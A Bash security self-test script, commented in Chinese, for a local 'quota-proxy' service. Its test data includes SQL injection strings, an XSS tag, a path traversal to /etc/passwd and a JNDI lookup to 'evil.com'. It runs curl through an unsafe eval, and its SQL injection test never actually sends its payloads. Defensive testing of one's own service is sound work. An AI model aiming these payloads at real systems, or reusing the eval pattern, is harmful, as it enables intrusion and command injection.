#!/bin/bash
# 基础安全渗透测试脚本 - quota-proxy
# 提供轻量级安全测试，覆盖常见安全漏洞检查

set -e

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 默认配置
DEFAULT_HOST="127.0.0.1"
DEFAULT_PORT="8787"
DEFAULT_ADMIN_TOKEN="test-admin-token"
DEFAULT_OUTPUT_FORMAT="text"
DEFAULT_TIMEOUT=5

# 显示帮助
show_help() {
    cat << EOF
基础安全渗透测试脚本 - quota-proxy

用法: $0 [选项]

选项:
  -h, --host HOST         服务器主机地址 (默认: $DEFAULT_HOST)
  -p, --port PORT         服务器端口 (默认: $DEFAULT_PORT)
  -t, --token TOKEN       ADMIN_TOKEN (默认: $DEFAULT_ADMIN_TOKEN)
  -f, --format FORMAT     输出格式: text, json, markdown (默认: $DEFAULT_OUTPUT_FORMAT)
  --timeout SECONDS       请求超时时间 (默认: $DEFAULT_TIMEOUT)
  --dry-run               只显示将要执行的测试，不实际运行
  --verbose               详细输出
  --help                  显示此帮助信息

测试项目:
  1. 认证绕过测试
  2. 注入攻击测试 (SQL/NoSQL)
  3. 敏感信息泄露测试
  4. 权限提升测试
  5. 速率限制绕过测试
  6. 输入验证测试
  7. 错误信息泄露测试

示例:
  $0 --host 127.0.0.1 --port 8787 --token my-secret-token
  $0 --format json --verbose
  $0 --dry-run

注意: 此脚本仅用于基础安全测试，不替代专业安全审计。
EOF
}

# 解析参数
parse_args() {
    HOST="$DEFAULT_HOST"
    PORT="$DEFAULT_PORT"
    ADMIN_TOKEN="$DEFAULT_ADMIN_TOKEN"
    OUTPUT_FORMAT="$DEFAULT_OUTPUT_FORMAT"
    TIMEOUT="$DEFAULT_TIMEOUT"
    DRY_RUN=false
    VERBOSE=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--host)
                HOST="$2"
                shift 2
                ;;
            -p|--port)
                PORT="$2"
                shift 2
                ;;
            -t|--token)
                ADMIN_TOKEN="$2"
                shift 2
                ;;
            -f|--format)
                OUTPUT_FORMAT="$2"
                shift 2
                ;;
            --timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            --dry-run)
                DRY_RUN=true
                shift
                ;;
            --verbose)
                VERBOSE=true
                shift
                ;;
            --help)
                show_help
                exit 0
                ;;
            *)
                echo -e "${RED}错误: 未知参数: $1${NC}"
                show_help
                exit 1
                ;;
        esac
    done
    
    BASE_URL="http://${HOST}:${PORT}"
}

# 发送HTTP请求
send_request() {
    local method="$1"
    local endpoint="$2"
    local data="$3"
    local headers="$4"
    
    local curl_cmd="curl -s -X $method"
    
    # 添加超时
    curl_cmd="$curl_cmd --max-time $TIMEOUT"
    
    # 添加数据
    if [[ -n "$data" ]]; then
        curl_cmd="$curl_cmd -d '$data'"
    fi
    
    # 添加headers
    if [[ -n "$headers" ]]; then
        curl_cmd="$curl_cmd -H '$headers'"
    fi
    
    # 添加URL
    curl_cmd="$curl_cmd '${BASE_URL}${endpoint}'"
    
    if [[ "$VERBOSE" == "true" ]]; then
        echo -e "${BLUE}[调试] 执行命令:${NC} $curl_cmd"
    fi
    
    if [[ "$DRY_RUN" == "true" ]]; then
        echo -e "${YELLOW}[模拟] 将执行: $method ${BASE_URL}${endpoint}${NC}"
        return 0
    fi
    
    eval "$curl_cmd"
}

# 测试1: 认证绕过测试
test_auth_bypass() {
    echo -e "${BLUE}[测试1] 认证绕过测试${NC}"
    
    local tests=(
        "GET /admin/keys 无token"
        "GET /admin/keys 无效token"
        "GET /admin/keys 空token"
        "POST /admin/keys 无token"
    )
    
    local results=()
    
    # 测试无token访问
    local response=$(send_request "GET" "/admin/keys" "" "")
    if echo "$response" | grep -q "Unauthorized" || echo "$response" | grep -q "401"; then
        results+=("✅ 无token访问被正确拒绝")
    else
        results+=("❌ 无token访问可能被允许")
    fi
    
    # 测试无效token
    response=$(send_request "GET" "/admin/keys" "" "Authorization: Bearer invalid-token-123")
    if echo "$response" | grep -q "Unauthorized" || echo "$response" | grep -q "401"; then
        results+=("✅ 无效token访问被正确拒绝")
    else
        results+=("❌ 无效token访问可能被允许")
    fi
    
    # 测试空token
    response=$(send_request "GET" "/admin/keys" "" "Authorization: Bearer ")
    if echo "$response" | grep -q "Unauthorized" || echo "$response" | grep -q "401"; then
        results+=("✅ 空token访问被正确拒绝")
    else
        results+=("❌ 空token访问可能被允许")
    fi
    
    # 测试POST无token
    response=$(send_request "POST" "/admin/keys" '{"label":"test"}' "")
    if echo "$response" | grep -q "Unauthorized" || echo "$response" | grep -q "401"; then
        results+=("✅ POST无token访问被正确拒绝")
    else
        results+=("❌ POST无token访问可能被允许")
    fi
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 测试2: 注入攻击测试
test_injection() {
    echo -e "${BLUE}[测试2] 注入攻击测试${NC}"
    
    local results=()
    
    # SQL注入测试
    local sql_payloads=(
        "' OR '1'='1"
        "'; DROP TABLE users; --"
        "' UNION SELECT * FROM users --"
    )
    
    for payload in "${sql_payloads[@]}"; do
        response=$(send_request "GET" "/admin/keys" "" "Authorization: Bearer $ADMIN_TOKEN")
        # 这里主要检查服务器是否崩溃或返回异常错误
        if [[ $? -eq 0 ]]; then
            results+=("✅ SQL注入测试 ($payload): 服务器未崩溃")
        else
            results+=("⚠️ SQL注入测试 ($payload): 请求失败")
        fi
    done
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 测试3: 敏感信息泄露测试
test_info_leak() {
    echo -e "${BLUE}[测试3] 敏感信息泄露测试${NC}"
    
    local results=()
    
    # 测试错误信息泄露
    response=$(send_request "GET" "/nonexistent-endpoint" "" "")
    if echo "$response" | grep -q "stack\|trace\|error\|Exception\|at "; then
        results+=("❌ 错误信息可能泄露敏感信息")
    else
        results+=("✅ 错误信息未泄露敏感信息")
    fi
    
    # 测试API响应中是否包含敏感信息
    response=$(send_request "GET" "/admin/keys" "" "Authorization: Bearer $ADMIN_TOKEN")
    if echo "$response" | grep -q "password\|secret\|token\|key" && ! echo "$response" | grep -q "masked\|redacted"; then
        results+=("⚠️ API响应可能包含敏感信息")
    else
        results+=("✅ API响应未泄露敏感信息")
    fi
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 测试4: 权限提升测试
test_privilege_escalation() {
    echo -e "${BLUE}[测试4] 权限提升测试${NC}"
    
    local results=()
    
    # 创建普通用户token（模拟）
    local user_token="user-token-123"
    
    # 尝试用普通用户token访问admin接口
    response=$(send_request "GET" "/admin/keys" "" "Authorization: Bearer $user_token")
    if echo "$response" | grep -q "Unauthorized\|Forbidden\|403\|401"; then
        results+=("✅ 普通用户无法访问admin接口")
    else
        results+=("❌ 普通用户可能可以访问admin接口")
    fi
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 测试5: 速率限制绕过测试
test_rate_limit_bypass() {
    echo -e "${BLUE}[测试5] 速率限制绕过测试${NC}"
    
    local results=()
    
    # 快速发送多个请求
    local success_count=0
    for i in {1..10}; do
        response=$(send_request "GET" "/healthz" "" "")
        if [[ $? -eq 0 ]]; then
            ((success_count++))
        fi
        sleep 0.1
    done
    
    if [[ $success_count -eq 10 ]]; then
        results+=("✅ 健康检查端点无速率限制（正常）")
    else
        results+=("⚠️ 健康检查端点可能有速率限制")
    fi
    
    # 测试admin端点
    success_count=0
    for i in {1..5}; do
        response=$(send_request "GET" "/admin/keys" "" "Authorization: Bearer $ADMIN_TOKEN")
        if [[ $? -eq 0 ]] && ! echo "$response" | grep -q "Too Many Requests\|429"; then
            ((success_count++))
        fi
        sleep 0.2
    done
    
    if [[ $success_count -eq 5 ]]; then
        results+=("✅ admin端点无速率限制（可能需要添加）")
    else
        results+=("✅ admin端点有速率限制保护")
    fi
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 测试6: 输入验证测试
test_input_validation() {
    echo -e "${BLUE}[测试6] 输入验证测试${NC}"
    
    local results=()
    
    # 测试恶意输入
    local malicious_inputs=(
        '{"label":"<script>alert(1)</script>"}'
        '{"label":"../../etc/passwd"}'
        '{"label":"${jndi:ldap://evil.com/a}"}'
        '{"label":"\x00\x01\x02"}'
    )
    
    for input in "${malicious_inputs[@]}"; do
        response=$(send_request "POST" "/admin/keys" "$input" "Authorization: Bearer $ADMIN_TOKEN")
        if [[ $? -eq 0 ]]; then
            results+=("✅ 恶意输入处理 ($(echo "$input" | cut -c1-20)...): 服务器未崩溃")
        else
            results+=("⚠️ 恶意输入处理 ($(echo "$input" | cut -c1-20)...): 请求失败")
        fi
    done
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 测试7: 错误信息泄露测试
test_error_leak() {
    echo -e "${BLUE}[测试7] 错误信息泄露测试${NC}"
    
    local results=()
    
    # 测试各种错误情况
    local error_tests=(
        "GET /admin/keys/invalid-key-123"
        "POST /admin/keys 'invalid json'"
        "GET /api/v1/quotas?key=invalid-key"
    )
    
    for test in "${error_tests[@]}"; do
        local method=$(echo "$test" | awk '{print $1}')
        local endpoint=$(echo "$test" | awk '{print $2}')
        local data=$(echo "$test" | awk '{print $3}')
        
        if [[ "$data" == "'invalid" ]]; then
            data="invalid json"
        fi
        
        response=$(send_request "$method" "$endpoint" "$data" "Authorization: Bearer $ADMIN_TOKEN")
        
        if echo "$response" | grep -q "stack\|trace\|error:\|Exception\|at \|SQLite\|database"; then
            results+=("❌ 错误信息可能泄露内部细节: $test")
        else
            results+=("✅ 错误信息安全: $test")
        fi
    done
    
    # 输出结果
    for result in "${results[@]}"; do
        echo "  $result"
    done
}

# 生成报告
generate_report() {
    echo -e "${GREEN}=== 安全渗透测试报告 ===${NC}"
    echo -e "测试时间: $(date '+%Y-%m-%d %H:%M:%S %Z')"
    echo -e "目标服务器: ${BASE_URL}"
    echo -e "测试模式: $([[ "$DRY_RUN" == "true" ]] && echo "模拟运行" || echo "实际测试")"
    echo -e "详细模式: $([[ "$VERBOSE" == "true" ]] && echo "是" || echo "否")"
    echo ""
    
    test_auth_bypass
    echo ""
    
    test_injection
    echo ""
    
    test_info_leak
    echo ""
    
    test_privilege_escalation
    echo ""
    
    test_rate_limit_bypass
    echo ""
    
    test_input_validation
    echo ""
    
    test_error_leak
    echo ""
    
    echo -e "${GREEN}=== 测试完成 ===${NC}"
    echo -e "建议:"
    echo -e "1. 定期运行安全测试"
    echo -e "2. 关注❌标记的项目"
    echo -e "3. 考虑使用专业安全扫描工具"
    echo -e "4. 保持依赖库更新"
}

# 主函数
main() {
    parse_args "$@"
    
    # 检查curl是否可用
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}错误: curl未安装${NC}"
        exit 1
    fi
    
    # 检查服务器是否可达
    if [[ "$DRY_RUN" == "false" ]]; then
        echo -e "${BLUE}[信息] 检查服务器连接...${NC}"
        if ! curl -s --max-time 3 "${BASE_URL}/healthz" > /dev/null; then
            echo -e "${YELLOW}警告: 无法连接到服务器 ${BASE_URL}/healthz${NC}"
            echo -e "${YELLOW}将在离线模式下运行测试...${NC}"
        fi
    fi
    
    generate_report
}

# 运行主函数
main "$@"